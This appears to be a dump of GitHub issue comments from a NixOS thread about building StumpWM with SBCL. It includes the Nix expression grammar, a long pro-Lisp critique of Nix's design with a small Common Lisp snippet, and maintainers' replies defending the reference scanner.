4041	"This issue is fascinating, I've never seen a bug report written in LISP before. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @gabriel-laddel .

I see that you try to build EMACS from the command line. That's not how it is done in NixOS as that's not repeatable and stateful. Either you clone nixpkgs and change the nix expressions already there, or you use the packageOverrides in your `~/.nixpkgs/config.nix` (see http://lethalman.blogspot.it/2014/11/nix-pill-17-nixpkgs-overriding-packages.html).

You asked 1 question on #nixos and then logged off when you got no replies? Perhaps the nix-dev mailing list would be more suited to your IRC style.

I general I would say there is a passion for code quality and statelessness in NixOS, just go look at all the comments on issues asking to change this or that. You seem to have gotten the reverse impression from the learning curve and EMACS. Nothing I can do about that, just interesting. If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away.

I don't know what causes your SBCL error. The guys in the LISP channel are correct, when you build something for Nix you fix all inputs, and if something doesn't work like that you wrap it so it only sees the part of the world that you want. 

Oh, those sb-posix test failures are also perplexing. Expecting 13, getting /? Wow. Of course, just turning them off was not the right thing to do.

Anyway.
"
4042	"Oh and hats off to @thoughtpolice for his detailed and gracious answers.
"
4043	"Oh, and I will leave one mention about the IRC channel: I am not sure in what timezone the OP resides, but realistically from my time contributing I've noticed NixOS has a very large European userbase and a much smaller ""not European"" userbase. Given the assumption the logs are timestamped to a European timezone, it's perhaps not surprising most people weren't available in the early morning hours.

So knowing nothing about OP, I imagine this could possibly have some impact on the availability of people to respond. As an American myself, this too has caught me off guard. So yes, the `nix-dev` mailing list may actually be a better place to formulate longer discussions, depending on your availability.
"
4044	"Also, currently NixPkgs has a working StumpWM 0.9.8 package (previous release) compiled using SBCL-1.2.5 (which is also in NixPkgs).

Some of SBCL tests make assumptions about the base system;  the others are run during the SBCL build: http://hydra.nixos.org/build/16738664/log/raw (look for ACLREPL-TESTS)
"
4045	"@gabriel-laddel:

> eg, where is the BNF form for the Nix language?

There's an [SDF](http://strategoxt.org/Sdf) representation of the syntax in @edolstra's [PHD thesis](http://nixos.org/~eelco/pubs/phd-thesis.pdf) starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly.
"
4046	"@Shados actually, you could say that https://github.com/NixOS/nix/blob/b6809608cc467925db44b1eb435095c37e433255/src/libexpr/parser.y#L298-L523 (Bison configuration) is a very strict, machine-readable BNF form... I wonder if there's a tool that takes Bison input and generates a human-readable grammar.
"
4047	"I've seen everyone's responses and will be responding in due time.
"
4048	"Relevant, apparently you can get an almost-BNF out of bison with `-v`: http://stackoverflow.com/questions/19477103/extract-bnf-grammar-rules-from-yacc-file
"
4049	"FWIW, here's the grammar. The tokens are defined in https://github.com/NixOS/nix/blob/master/src/libexpr/lexer.l#L80.

```
0 $accept: start $end

1 start: expr

2 expr: expr_function

3 expr_function: ID ':' expr_function
4              | '{' formals '}' ':' expr_function
5              | '{' formals '}' '@' ID ':' expr_function
6              | ID '@' '{' formals '}' ':' expr_function
7              | ASSERT expr ';' expr_function
8              | WITH expr ';' expr_function
9              | LET binds IN expr_function
10              | expr_if

11 expr_if: IF expr THEN expr ELSE expr
12        | expr_op

13 expr_op: '!' expr_op
14        | '-' expr_op
15        | expr_op EQ expr_op
16        | expr_op NEQ expr_op
17        | expr_op '<' expr_op
18        | expr_op LEQ expr_op
19        | expr_op '>' expr_op
20        | expr_op GEQ expr_op
21        | expr_op AND expr_op
22        | expr_op OR expr_op
23        | expr_op IMPL expr_op
24        | expr_op UPDATE expr_op
25        | expr_op '?' attrpath
26        | expr_op '+' expr_op
27        | expr_op '-' expr_op
28        | expr_op '*' expr_op
29        | expr_op '/' expr_op
30        | expr_op CONCAT expr_op
31        | expr_app

32 expr_app: expr_app expr_select
33         | expr_select

34 expr_select: expr_simple '.' attrpath
35            | expr_simple '.' attrpath OR_KW expr_select
36            | expr_simple OR_KW
37            | expr_simple

38 expr_simple: ID
39            | INT
40            | '""' string_parts '""'
41            | IND_STRING_OPEN ind_string_parts IND_STRING_CLOSE
42            | PATH
43            | SPATH
44            | URI
45            | '(' expr ')'
46            | LET '{' binds '}'
47            | REC '{' binds '}'
48            | '{' binds '}'
49            | '[' expr_list ']'

50 string_parts: STR
51             | string_parts_interpolated
52             | %empty

53 string_parts_interpolated: string_parts_interpolated STR
54                          | string_parts_interpolated DOLLAR_CURLY expr '}'
55                          | STR DOLLAR_CURLY expr '}'
56                          | DOLLAR_CURLY expr '}'

57 ind_string_parts: ind_string_parts IND_STR
58                 | ind_string_parts DOLLAR_CURLY expr '}'
59                 | %empty

60 binds: binds attrpath '=' expr ';'
61      | binds INHERIT attrs ';'
62      | binds INHERIT '(' expr ')' attrs ';'
63      | %empty

64 attrs: attrs attr
65      | attrs string_attr
66      | %empty

67 attrpath: attrpath '.' attr
68         | attrpath '.' string_attr
69         | attr
70         | string_attr

71 attr: ID
72     | OR_KW

73 string_attr: '""' string_parts '""'
74            | DOLLAR_CURLY expr '}'

75 expr_list: expr_list expr_select
76          | %empty

77 formals: formal ',' formals
78        | formal
79        | %empty
80        | ELLIPSIS

81 formal: ID
82       | ID '?' expr
```
"
4050	"There has been no activity for a couple of weeks, so I'll close the issue. If there are actionable items hidden in this thread somewhere, I guess it would be better to create separate, new tickets for those.
"
4051	"I'll note that I've drafted my response to all unanswered messages but am busy and don't know when I'll have time to finish it off.

Closing the issue is fine with me. 
"
4052	"@gabriel-laddel just paste your draft? Otherwise you'll never come back to it...
"
4053	"I don't publish drafts. I'm in the middle of something at the moment and will respond over the weekend.
"
4054	":-) reminds me of classical _Cathedral vs. Bazaar_ dilemma.
"
4055	"Wasn't able to finish over the weekend and am busy for the next two days. Best guess is wed/thurs.
"
4056	"Note1: I've read NixOS: A Purely Functional Linux Distribution and Nix: A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas.

Note2: I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it.

Note3: I posted and deleted this approximately ~5min ago - sorry, the using ``` as blockquote didn't work as expected.

Fundamentally, package management is composed of graph traversals and transformations. The goal that separates NixOS from other package managers, reproducible builds, can be rendered as ""the ability to save and restore unix's dependency graph"". This is a neat idea, but the implementation merely trades one set of problems for another. Many crucial design decisions that should have been throughly discussed were completely ignored. For example, nowhere in the design documents is it stated that every(?) programming language already has its own package manager(s) with its own idiosyncrasies that for the most part don't share concepts or code with the others. There are many good questions that originate from this fact, were one to acknowledge it. Examples: at what point is appropriate to leave package management up to a language's ecosystem? Is there ever a reason to? Can maintainers be convinced that the 'nixos way' is a good one and that packaging their code with a flag of some sort that produces a nix friendly build script is a reasonable request? Are we confident enough in nix to spend their time? Given that the NixOS plan is to modify build scripts and sources to its liking, what is the proper way to go about doing source-to-source transformations? Are there commercial offerings that solve this problem? The undiscussion of these issues is prototypical of the Nix design documents and documentation. 

From NixOS: A Purely Functional Linux Distribution,

> _Runtime dependencies_ In Nix, we generally try to fix runtime dependencies at build time. This means that while a program may execute other programs or load dynamic libraries at runtime, the paths to those dependencies are hard-coded into the program at build time. For instance, for ELF executables, we set the RPATH in the executable such that it will find a statically determined set of library dependencies at runtime, rather than using a dynamic mechanism such as the LD_LIBRARY_PATH environment variable to look up libraries. This is important, because the use of such dynamic mechanisms makes it harder to run applications with conflicting dependencies at the same time (e.g., we might need Firefox linked against GTK 2.8 and Thunder bird linked against GTK 2.10). It also enhances determinism: a program will not suddenly behave differently on another system or under another user account because environment variables happen to be different. However, there is one case in NixOS and Nixpkgs of a library dependency that /must/ be overridable at runtime and cannot be fixed statically: the implementation of OpenGL to be used at runtime (libGL.so) which is hardware specific. We build applications that need OpenGL against Mesa, but add the impure (stateful) path /var/run/opengl-driver to the RPATH. The activate script syslinks that path to the actual OpenGL implementation selected by the configuration (e.g., nvidiaDriver) to allow programs to use it.
> 
> [...]
> 
> _Build actions_ The Nix /model/ is that derivations are pure, that is, two builds of identical derivation should produce the same result in the Nix store. However, in contemporary operating systems, there is no way to actually enforce this model. Builders can use any impure source of information to produce the output, such as the system time, data downloaded from the network, or the current number of processes in the system as seen in /proc. It is trivial to construct a contrived builder that does such things. But build processes in the system as seen in /proc. But build processes generally do not, and instead are fairly determinisitc; impure influences such as the system time generally do not affect the runtime behavior of the package in question.
> 
> There are however frequent exceptions. First, many build processes are greatly affected by environment variables, such as PATH or CFLAGS. Therefore we clear the environment before starting a build (except for the attributes variable to a non-existent directory, because some derivations (such as Qt) try and read settings) from the user's home directory.
> 
> Second, almost all packages look for dependencies in impure locations such as /usr/bin and /usr/include. Indeed, the undeclared dependencies caused by this behavior are what motivated Nix in the first place: by storing packages in isolation from each other, we prevent undeclared build-time dependencies. In five years we haven't had a single instance of a package having an undeclared build-time dependency on another package /in the Nix store/, or having a runtime dependency in the Nix store not detected by the reference scanner. However, with Nix under other Linux distributions or operating systems, there have been numerous instances of packages affected by paths outside the Nix store. We prevent most of those impurities through a wrapper script around GCC and ld that ignores or fails on paths outside of the store. However, this cannot prevent undeclared dependencies such as direct calls to other programs, e.g., a Makefile running /usr/bin/yacc.
> 
> Since NixOS has no /bin, /usr and /lib, the effect of such impurities is greatly reduced. However, even in NixOS such impurities can occur. For instance, we recently encountered a problem with the build of the dbus package, which failed when /var/run/dbus didn't exist.
> 
> As a final example of impurity, some packages try to install files under a different location than $out. Nix causes such packages to /fail deterministically/ by executing builders under unprivileged UIDs that do not have write permisions to  other store paths other than $out, let alone paths such as /bin. This packages must then be patched to make them well-behaved.
> 
> To ascertain how well these measures work in preventing impurities in NixOS, we performed two builds of the Nixpkgs collection on two different NixOS machines. This consisted of building 485 non-fetch url derivations. The output consisted of 165927 files and directories. Of these, there was only one /file name/ that differed between the two builds, namely in mono-1.1.4: a directory gac/IBM.Data.DB2/1.0.3008.37160_7c307b91aa13d208 versus 1.0.3008.40191_7c307b91aa13d280. The differing number is likely derived from system time.
> 
> We then compared each file. There we differences in 5059 files, or 3.4% of all regular files. We inspected the nature of the differences: almost all were caused by timestamps being encoded in files, such as in Unix object files archives or compiled Python code. 1048 Emacs Lisp files differed because the hostname of the build machines were stored in the output. Filtering out these and other files types that are known to contain timestamps as well (such as a build process inserting the build time in a C string). This hypothesis is strongly0 supported by the fact that of those, only 42 (or 0.03%) had different files sizes. None of these content differences have ever caused an observable difference in behavior.

How exactly does the reference scanner detect runtime dependencies? Regex and sed hackery? Or the correct way, parsing each language into its abstract syntax tree (ast), walking that and finding references to unix level dependencies (both static and dynamic)? I assume the former, as the latter is a great deal of work and would have been mentioned. Also, the only complete C99 parser (i.e., one that takes into account all the GCC extensions used in the linux kernel) I'm aware of is the haskell package Language.C.AST - and nix doesn't use haskell. 

The problem with anything other than traversing a language's ast is that you're forever stuck with an approximation of the input language, resulting in false positives etc. This is not new information.

> Much of the New Jersey approach is about getting away with less than is necessary to get the /complete/ job done.  E.g., perl, is all about doing as little as possible that can approximate the full solution, sort of the entertainment industry's special effects and make-believe works, which for all practical purposes /is/ the real thing.  Regular expressions is a pretty good approximation to actually parsing the implicit language of the input, too, but the rub with all these 90% solutions is that you have /no/ idea when they return the wrong value because the approximation destroys any ability to determine correctness.  Most of the time, however, the error is large enough to cause a crash of some sort, but there is no way to do transactions, either, so a crash usually causes a debugging and rescue session to recover the state prior to the crash.  This is deemed acceptable in the New Jersery approach.  The reason they think this also /should/ be acceptable is that they believe that getting it exactly right is more expensive than fixing things after crashes.  Therefore, the whole language must be optimized for getting the first approximations run fast.
> 
> -- http://www.xach.com/naggum/articles/3244575386963745@naggum.no.html

Notice that the paper says,

> by storing packages in isolation from each other, we prevent undeclared build-time dependencies. In five years we haven't had a single instance of a package having an undeclared build-time dependency on another package /in the Nix store/, or having a runtime dependency in the Nix store not detected by the reference scanner.

but fails to mention how many people used NixOS over those 5 years, how many times undeclared build time dependencies /outside/ of the Nix store were encountered or how many packages were in the Nix store over this time period. Is this not relevant information? As Naggum stated above: ""the rub with these 90% solutions is that you have /no/ idea when they return the wrong value becuase the approximation destroys any ability to determine correctness."" If say, most of the NixOS users are NixOS developers (which they are) and the reference scanner doesn't walk the ast of the programs in question (which it doesn't), no reported failures means exactly nothing, because there will be many code paths not encountered by its users due to the sheer complexity of the software being interfaced with (e.g., how many NixOS +developers+ users use emacs docview? Not many apparently).

There are other issues with these papers I'm going to skip over, such as the clearing of environment variables (the proper thing to do imo is to gensym them to prevent unwanted interactions and study how they're being used - filter for 'functional' builds...), failure to discuss why a new project is needed in the first place (why can't you just perform this computation via an extension to an existing project?), total wtf issues with the papers (who are they written for? One who needs the concept of ""file system"" explained is going to have nfi what emacs lisp or ~/what/all/the/slashes/signify) etc.

The heart of the matter is that unix (ostensibly[0]) plays host to many different philosophies of how to go about programming. Languages differ in their approach to build systems, package management, syntax and foreign function interfaces. To change the way many software packages are built in a semi-automated, non-ast-walking fashion is insane. Not to discuss this in the design documents is insane. NixOS has 46 contributors and the documentation is sufficiently general as to give each contributor his own wildly different interpretation of the scope of the project. As far as I can tell, were one to extrapolate from the given information to a set of concrete requirements we see that NixOS plans to rewrite the build scripts for every version of every project on unix. Again, this is insane. The correct thing to do in this situation is to realize the utter impossibility of the task that has been set forth and re-evaluate one's approach.[1] 

Let's examine the reference scanner. What is the correct way to approach the problem? We know regular expressions cannot respect the semantics of a language and thus are (unless used as a part of a larger parser) inappropriate for meta-programming (source-to-source transformations). Thus, we must work by manipulating the ast of various languages, and then pretty printing the altered code into the language's concrete syntax. 

Most languages don't offer the ability to do this, and if one examines e.g., Clang, he will see all sorts of nonsense about concrete/surface syntax, context free grammars and compiler technologies. This certainly can't all be necessary (hint: it isn't). 

Consider the following mathematical expression:

(3 + 2) \* 8 / 3 \* 3^6

Fully parenthesizing yields:

(((3 + 2) \* 8) / (3 \* 3^6))

When computers execute programs, or humans mathematics, the order of operations must be taken into account. one way to notate the previous expression to remove such ambiguities present in mathematical notation is to move operators to the front of each parenthesized list, passing the remaining elements as its arguments. This is known as fully-parenthesized prefix notation.

(/ (\* (+ 3 2) 8) (\* 3 (^ 3 6)))

This notational scheme has a direct mapping to the program's ast, which can be rendered as

http://i.imgur.com/8TO5VcK.png

See the pattern? An s-expression (fully parenthesized prefix notation) is merely a serialization for the ast. Thus,  manipulations of the sexpr correspond to manipulations of the ast. Languages with the vocabulary to manipulate the s-expression structure can manipulate themselves (their ast) just as easily as any other thusly structured information. It follows from this that all software 'tooling' and translation tasks, are transparently tree traversals e.g., find me all things that call this function, reference this variable, modify all build scripts to take into account the new &optional argument in the updated library, etc.[2]

For whatever reason, many find s-expressions distasteful and spend much of their lives attempting to add the same meta-programming facilities to ALGOL derived languages. They all have failed. Not because of any sort of mechanical failing of the computer, but the human's inability to fully comprehend the parsing and syntactical schemes they're able to create (Ruby's parser is 10k lines of C, Clang's is >100k loc. Note that the entirety of SBCL is ~300k loc, and has much fat that could be trimmed off - http://www.cliki.net/Lisp%20-%20Next%20Generation). 

Scala is a notable failure in this regard. Watch this video:

http://www.youtube.com/watch?v=TS1lpKBMkgg

Pay attention to 37:39-42:50 and you'll get to see Paul Phillips flipping out over ir/asts (same thing!). He even states his plan for the next 25 years - attempt to solve a problem solved 50+ years ago (http://c2.com/cgi/wiki?LispOnePointFive). 

In particular, I found these quotes quite pertinent. 

""I want to programmatically generate asts and feed those""
""Even though this is what everybody does it's kinda nuts, why is the canonical code representation a STRING?!""

(not everyone does this, just algol derivatives)

""The ast is going to be designed along side the VM""
""I need a tight feedback loop on the thing that I'm working on right now""

Wait, like every common lisp compiler ever? 30+ years behind the times yo.

""the code that you look at, that ought to be a reflection of the AST. The canonical thing ought to be the tree, the code is a view of it.... It's trees that are fundamental, that's what we work with""

Lol. Gotcha.

""something not offered by our tremendously entangled compiler, which doesn't even have a clean parse tree. It's comical. Try to get back to the source from what you get out of the scala parser. To me, the minimum test of a parser is that it parses!""

Lol. 'Comical' is definitely the right word.

""modifiability is paramount. If it isn't straightforward to modify, it will never be any good. It will never be fast. It will never be correct. And it will eventually be replaced by something modifiable... after consuming as many hours as you feed it.""

Again, 30+ yrs behind the times[3]: http://article.gmane.org/gmane.comp.java.clojure.user/34272

So what does all this have to do with NixOS?

Much of the complexity in NixOS originates in the failure to address why it isn't a trivial modification on an existing project. Were they to have honestly sized up the problem they'd end up at something like: people suck at both reading & programming, also asts are fundamental. They'd then realize that at some point you have to choose some languages and leave others, because not everyone has something to offer and writing fully compliant parsers for all the languages involved is about as entertaining as building pyramids. When one has decided on a particular scheme, one could set about implementing ""the ability to save and restore parts of unix's dependency graph"". 

But by failing to address this complexity NixOS inherits it, and in practice, adds to it by the 'invention' of /yet another/ language created for no particular reason. 800+ existing languages[4] and /none of them/ have the required properties? Nonsense. Allow me to anticipate your retorts:

""I need to know that my nix code is functional""

```
;; let's assume, for the sake of argument that you only want the symbols
;; `functional-lol', `design-antipattern', `the-type-gods-will-save-me' plus
;; strings to occur in your 'language' in addition to strings and keywords. You
;; know that the functions these symbols describe are functional and thus, a
;; valid program is functional.
;;
;; here is how you validate a 'nix' ast. 

(defun flatten (tree)
  ""Traverses the tree in order, collecting non-null leaves into a list.""
  (let (list)
    (labels ((traverse (subtree)
               (when subtree
                 (if (consp subtree)
                     (progn
                       (traverse (car subtree))
                       (traverse (cdr subtree)))
                     (push subtree list)))))
      (traverse tree))
    (nreverse list)))

(defvar myast '(functional-lol (design-antipattern ""death"") 
                               (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies"")))

(defun validate (ast)
  (every (lambda (k) (or (keywordp k) (and (symbolp k)
             (member k '(functional-lol design-antipattern the-type-gods-will-save-me) :test 'eq)) 
            (stringp k)))
     (flatten ast)))

(validate myast) ; => nil
```

""I don't want to require a whole compiler!""

By failing to make use of existing programs NixOS not only adds a language (compiler/interpreter), but the requirement for an Emacs mode (+1 more for every other editor!), custom syntax highlighting, extra crap for auto-completion etc. etc. One should instead make use of what already exists. As it stands SLOCCOUNT reports 26.3k loc, divided across 7 languages being are used to introduce another for the nix project. This number of languages alone is enough to guarantee that no one will ever understand the whole codebase on a rolling basis and have enough time to do much else with their life.

A preceptable analogy to the natural languages springs forth: if we created them for the same reason so-called professional programmers create programming languages, each new subculture would require a whole new alphabet/glyph scheme, phonetic system, grammatical structures etc. Though some surface features may be shared across languages, the underlying semantics they represent would change in unpredictable and often incompatible ways.[5]

""So, you want us to write lisp? What if something better comes along?""

You are faced with a choice - either learn from those who came before you, or spend the rest of your life fighting monstrosities of your own creation, attempting to eke out some order in all the chaos, be it the SDF/BNF format of a language's syntax or otherwise. In any case, if something better comes along, transforming your s-expression code into $POWERFUL_NEW_NOTATION will be a straightforwards intern-level task[6].

Now to address some unanswered questions.

> If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away.

You don't say.

> I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @gabriel-laddel .

You're in Mexico city and ask a bystander to direct you to the airport (your phone died, you lack a map and you're going to miss your plane unless you make it to the airport soon). He gives very specific instructions, which you write down and follow exactly. You reach the last instruction somewhere near the slums, missing your flight. As such, you swear loudly.

Is anyone entitled to correct directions? Of course not. I however, expect the /bare minimum/ of people giving correct directions and accurate descriptions of their projects, much like I expect my friends to brush their teeth regularly.

> There's an SDF representation of the syntax in @edolstra's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly.

If I say ""jump in front of the bus on my mark, ready? 1, 2, 3 - JUMP!"" it is clear what I'm asking/ordering, what is less clear is why I'd be asking/ordering someone to jump in front of a bus.

> :-) reminds me of classical Cathedral vs. Bazaar dilemma.

There are very few classics in the field of computing. We are at the very beginning of this journey and it hasn't even begun to get interesting yet. IMHO, the Cathedral vs. Bazaar isn't in anyway a dilemma or a classic. Linux was a failure 20 years ago, it is a failure today and any posturing otherwise is just that. See The UNIX-HATERS Handbook[0] for more information.

I find the contrast between these quotes accurately depicts the computing situation circa 2015.

> The process of constructing instruction tables should be very fascinating. There need be no real danger of it ever becoming a drudge, for any processes that are quite mechanical may be turned over to the machine itself.
> 
> -- Turing, A. M., 1946, Proposed electronic calculator, report for National Physical Laboratory, Teddington
> 
> for the present-day darkness in the programmer's world the programmers themselves are responsible and nobody else.
> 
> -- Dijkstra
- Footnotes

[0] In actuality unix is mostly a pile of stupid, see: web.mit.edu/~simsong/www/ugh.pdf

[1]

> Suppose you're trying to find the best way to structure your description of something.  (Examples:  choosing the structure for a computer program to perform some task; or choosing the structure for a theory of physics.)
> 
> What you hope to find is the natural structure of what you're describing — a structure that affords a really beautiful, simple description.  When you strike the natural structure, a sort of resonance occurs, in which various subsidiary problems you may have had with your description just melt away, and the description practically writes itself.
> 
> But here's a problem that often occurs:  You've got a structure that affords a pleasing approximate description.  But as you try to tweak the description for greater precision, instead of the description getting simpler, as it should if you were really fine-tuning near the natural structure, instead the description gets more and more complicated.  What has happened, I suggest, is that you've got a local optimum in solution space, instead of the global optimum of the natural structure:  small changes in the structure won't work as well as the earlier approximation, and may not work at all, so fundamental improvement would require a large change to the structure.
> 
> -- http://fexpr.blogspot.com/2012/12/metaclassical-physics.html

[2] This scheme the surrounding ideas are so fundamental that they've sometime's referred to as ""Maxwell's equations of Software"". You can read more about Lisp and s-expressions elsewhere so I'll not repeat it here.

http://www.defmacro.org/ramblings/lisp.html
http://www.michaelnielsen.org/ddi/lisp-as-the-maxwells-equations-of-software/
http://norvig.com/lispy.html
http://norvig.com/lispy2.html

[3] This information re, Scala is interesting beyond the technicalities. Typesafe, the Scala company (has Martin Odersky as Chairman and Chief Scientist) has received 31 MM in funding. Coursera (who built everything in Scala) has received 85MM. I'll predict they'll eventually fail as they're out-competed by more intelligent adversaries, though both will (due the amount of funding and high-profile people involved, probably limp along for years to come).

Last I checked, Coursera already had fungus growing on it: something about, ""usg-sponsored studies find that coursera is better than starving in Africa""

[4] http://en.wikipedia.org/wiki/List_of_programming_languages

[5]

The corresponding lisp narrative feels 'organic'. Consider the SBCL (steel bank common lisp) compiler. It is descended from CMUCL python compiler and uses some of its code, changing it as circumstances require (and of course, any transformations that needed automation were but a tree traversal away). Naggum also had some related thoughts:

> There is a simple and elegant answer to this question: Just learn Common
> Lisp well first.  New languages are exciting to people who know mostly
> new languages, so learn an old language before you learn new ones and get
> out of the maelstrom that will drown you in ever new languages that add
> nothing at all except some miniscule additional feature from another
> language that someone needed to make a whole new language to implement
> because he did not know (Common) Lisp to begin with.  A ""new"" language
> that differs from the rest of the crop by one or a couple features is
> proof positive that both what it came from and what it has become are
> mutations about to die.  There are tens if not hundreds of thousands of
> such ""languages"" that people have invented over the yeare, for all sorts
> of weird purposes where they just could not use whatever language they
> were already using, could not extend it, and could not fathom how to
> modify its tools without making a whole new language.  They never stopped
> to think about how horribly wasteful this is, they just went on to create
> yet another language called Dodo, the Titanic, Edsel, Kyoto-agreement...
> 
> -- Erik Naggum, http://www.xach.com/naggum/articles/3206985430398054@naggum.net.html

[6] This could be largely automated, but that is a discussion for another day.
"
4057	"Holy wall of text @gabriel-laddel!

I understand that you fully wanted to underline your points but I would
have been happy with
- you didn't take existing source package management like CPAN into
  account 10 years ago
- you just scan for strings in the build output so you can not be 100%
  sure that the dependency graph is correct
- you invented Nix instead of using something like LISP

Those are your points right, or am I misunderstanding them/missing some?

Package management was indeed not built in from the beginning. The current
approach is to convert instructions to npm and friends into nix package
specifications. AFAIK this is in place for Haskell, Ruby, NodeJS, Python,
Go and maybe Perl, not sure. This works okay but still has problems when
semantics clash. The build flow is something like ""generate nix expressions
for dependencies, store in nixpkgs tree next to package and create nix
expression for the package"". Because of idempotency it doesn't matter if
dependencies are mentioned many times, if they result in the same inputs
hash they will be reused.

You can think of this as a very lazy static evaluation of needed packages
out of hundreds of thousands of third-party packages. Considering the
alternative of putting Nix expressions in other package management systems,
I think this works pretty well.

Regarding the hash checking, the observation of no problems with it still
stands. Dependency detection is quite robust and has low impact if
incorrect.
- False positives (a dependency is falsely detected) can only be due to
  spurious unused references (it happens and we fix it if found), or 32+ byte
  ascii strings (hash+package name/version) occurring by chance in compiled
  code (extremely unlikely)
- False negatives (a dependency is not detected) can happen if the
  references are not stored in plain text, due to compression or encoding. I
  don't know of this happening in any of nixpkgs.
- The impact of incorrect dependencies is either increasing closure
  size, or missing dependencies when garbage collecting or installing a
  package from binary. The former is hardly problematic, the latter hasn't
  happened yet afaik, despite automatic GC running on many production systems.

So yes, both those things are only 99.9% solutions, but they are gaining 9s
each year. The 100% solution seems infeasible to me in both cases.

For the last point, I think
http://sandervanderburg.blogspot.com/2012/11/on-nix-and-gnu-guix.html
articulates the issues nicely. Personally I prefer the advantages Nix gives
over what Guix gets via Scheme.

Thank you for posting your thoughts, I still believe that NixOS and
ecosystem are awesome and in a good position going forward.

On Sun Feb 08 2015 at 6:51:59 PM Gabriel Laddel notifications@github.com
wrote:

> Note1: I've read NixOS: A Purely Functional Linux Distribution and Nix: A
> Safe and Policy-Free System for Software Devlopment, but not the associated
> PHD thesis. The contents listing didn't indicate that it'd introduce me to
> any new ideas.
> 
> Note2: I've ignored forth and apl derivatives in this comment. Anyone
> familiar with will understand why upon reading it.
> 
> Note3: I posted and deleted this approximately ~5min ago - sorry, the
> using ``` as blockquote didn't work as expected.
> 
> Fundamentally, package management is composed of graph traversals and
> transformations. The goal that separates NixOS from other package managers,
> reproducible builds, can be rendered as ""the ability to save and restore
> unix's dependency graph"". This is a neat idea, but the implementation
> merely trades one set of problems for another. Many crucial design
> decisions that should have been throughly discussed were completely
> ignored. For example, nowhere in the design documents is it stated that
> every(?) programming language already has its own package manager(s) with
> its own idiosyncrasies that for the most part don't share concepts or code
> with the others. There are many good questions that originate from this
> fact, were one to acknowledge it. Examples: at what point is appropriate to
> leave package management up to a language's ecosystem? Is there ever a
> reason to? Can maintainers be convinced that the 'nixos way' is a good one
> and that packaging their code with a flag of some sort that produces a nix
> friendly build script is a reasonable request? Are we confident enough in
> nix to spend their time? Given that the NixOS plan is to modify build
> scripts and sources to its liking, what is the proper way to go about doing
> source-to-source transformations? Are there commercial offerings that solve
> this problem? The undiscussion of these issues is prototypical of the Nix
> design documents and documentation.
> 
> From NixOS: A Purely Functional Linux Distribution,
> 
> _Runtime dependencies_ In Nix, we generally try to fix runtime
> dependencies at build time. This means that while a program may execute
> other programs or load dynamic libraries at runtime, the paths to those
> dependencies are hard-coded into the program at build time. For instance,
> for ELF executables, we set the RPATH in the executable such that it will
> find a statically determined set of library dependencies at runtime, rather
> than using a dynamic mechanism such as the LD_LIBRARY_PATH environment
> variable to look up libraries. This is important, because the use of such
> dynamic mechanisms makes it harder to run applications with conflicting
> dependencies at the same time (e.g., we might need Firefox linked against
> GTK 2.8 and Thunder bird linked against GTK 2.10). It also enhances
> determinism: a program will not suddenly behave differently on another
> system or under another user account because environment variables happen
> to be different. However, there is one case in NixOS and Nixpkgs of a
> library dependency that /must/ be overridable at runtime and cannot be
> fixed statically: the implementation of OpenGL to be used at runtime
> (libGL.so) which is hardware specific. We build applications that need
> OpenGL against Mesa, but add the impure (stateful) path
> /var/run/opengl-driver to the RPATH. The activate script syslinks that path
> to the actual OpenGL implementation selected by the configuration (e.g.,
> nvidiaDriver) to allow programs to use it.
> 
> [...]
> 
> _Build actions_ The Nix /model/ is that derivations are pure, that is,
> two builds of identical derivation should produce the same result in the
> Nix store. However, in contemporary operating systems, there is no way to
> actually enforce this model. Builders can use any impure source of
> information to produce the output, such as the system time, data downloaded
> from the network, or the current number of processes in the system as seen
> in /proc. It is trivial to construct a contrived builder that does such
> things. But build processes in the system as seen in /proc. But build
> processes generally do not, and instead are fairly determinisitc; impure
> influences such as the system time generally do not affect the runtime
> behavior of the package in question.
> 
> There are however frequent exceptions. First, many build processes are
> greatly affected by environment variables, such as PATH or CFLAGS.
> Therefore we clear the environment before starting a build (except for the
> attributes variable to a non-existent directory, because some derivations
> (such as Qt) try and read settings) from the user's home directory.
> 
> Second, almost all packages look for dependencies in impure locations such
> as /usr/bin and /usr/include. Indeed, the undeclared dependencies caused by
> this behavior are what motivated Nix in the first place: by storing
> packages in isolation from each other, we prevent undeclared build-time
> dependencies. In five years we haven't had a single instance of a package
> having an undeclared build-time dependency on another package /in the Nix
> store/, or having a runtime dependency in the Nix store not detected by the
> reference scanner. However, with Nix under other Linux distributions or
> operating systems, there have been numerous instances of packages affected
> by paths outside the Nix store. We prevent most of those impurities through
> a wrapper script around GCC and ld that ignores or fails on paths outside
> of the store. However, this cannot prevent undeclared dependencies such as
> direct calls to other programs, e.g., a Makefile running /usr/bin/yacc.
> 
> Since NixOS has no /bin, /usr and /lib, the effect of such impurities is
> greatly reduced. However, even in NixOS such impurities can occur. For
> instance, we recently encountered a problem with the build of the dbus
> package, which failed when /var/run/dbus didn't exist.
> 
> As a final example of impurity, some packages try to install files under a
> different location than $out. Nix causes such packages to /fail
> deterministically/ by executing builders under unprivileged UIDs that do
> not have write permisions to other store paths other than $out, let alone
> paths such as /bin. This packages must then be patched to make them
> well-behaved.
> 
> To ascertain how well these measures work in preventing impurities in
> NixOS, we performed two builds of the Nixpkgs collection on two different
> NixOS machines. This consisted of building 485 non-fetch url derivations.
> The output consisted of 165927 files and directories. Of these, there was
> only one /file name/ that differed between the two builds, namely in
> mono-1.1.4: a directory gac/IBM.Data.DB2/1.0.3008.37160_7c307b91aa13d208
> versus 1.0.3008.40191_7c307b91aa13d280. The differing number is likely
> derived from system time.
> 
> We then compared each file. There we differences in 5059 files, or 3.4% of
> all regular files. We inspected the nature of the differences: almost all
> were caused by timestamps being encoded in files, such as in Unix object
> files archives or compiled Python code. 1048 Emacs Lisp files differed
> because the hostname of the build machines were stored in the output.
> Filtering out these and other files types that are known to contain
> timestamps as well (such as a build process inserting the build time in a C
